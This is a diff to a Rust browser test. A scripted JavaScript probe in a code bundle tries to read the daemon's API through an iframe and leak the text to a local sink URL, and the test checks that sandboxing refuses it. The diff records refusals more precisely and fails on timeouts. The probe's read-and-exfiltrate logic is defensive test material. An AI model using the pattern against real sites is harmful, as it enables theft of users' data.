@@ -2,6 +2,8 @@
 //! local daemon user frames an API response and sends what it read away by
 //! navigation. A code bundle's own scripts run on the daemon's origin, so
 //! before its document was sandboxed the frame was same-origin and readable.
+//! The probe reports `read:` with what it read, `denied:` with the refusal it
+//! observed (a frame-src violation or a cross-origin document), or `timeout`.
 //!
 //! Needs a headless Chrome: set `ONEIRON_E2E_CHROME` to its binary and run
 //! `cargo test -p oneiron-server --test it -- --ignored artifact_origin_browser`.
@@ -77,12 +79,16 @@ async fn a_code_artifact_cannot_read_the_api_through_a_frame_and_send_it_away() 
             "let sent = false;\n\
              function send(text) {{ if (sent) return; sent = true; \
              location.href = 'http://127.0.0.1:{sink_port}/leak?d=' + encodeURIComponent(text); }}\n\
+             document.addEventListener('securitypolicyviolation', (event) => {{ \
+             if (event.violatedDirective.startsWith('frame-src')) send('denied:frame-src'); }});\n\
              const frame = document.createElement('iframe');\n\
-             frame.onload = () => {{ try {{ send(frame.contentDocument.body.innerText); }} \
-             catch (error) {{ send('denied:' + error.name); }} }};\n\
+             frame.onload = () => {{ let page; \
+             try {{ page = frame.contentDocument; }} \
+             catch (error) {{ send(error.name === 'SecurityError' ? 'denied:SecurityError' : 'error:' + error.name); return; }} \
+             send(page === null ? 'denied:cross-origin' : 'read:' + page.body.innerText); }};\n\
              frame.src = '/api/entity/{target}';\n\
              document.body.appendChild(frame);\n\
-             setTimeout(() => send('denied:timeout'), 3000);\n"
+             setTimeout(() => send('timeout'), 5000);\n"
         ),
     )
     .expect("write probe");
@@ -180,9 +186,10 @@ async fn a_code_artifact_cannot_read_the_api_through_a_frame_and_send_it_away() 
         1,
         "the bundle's own script runs and reports once: {leaks:?}"
     );
+    // Only an observed refusal counts: a timeout or a probe error fails.
     assert!(
         leaks[0].starts_with("denied"),
-        "the bundle read an API response and sent it away: {}",
+        "the bundle's frame read was not refused: {}",
         leaks[0]
     );
 }
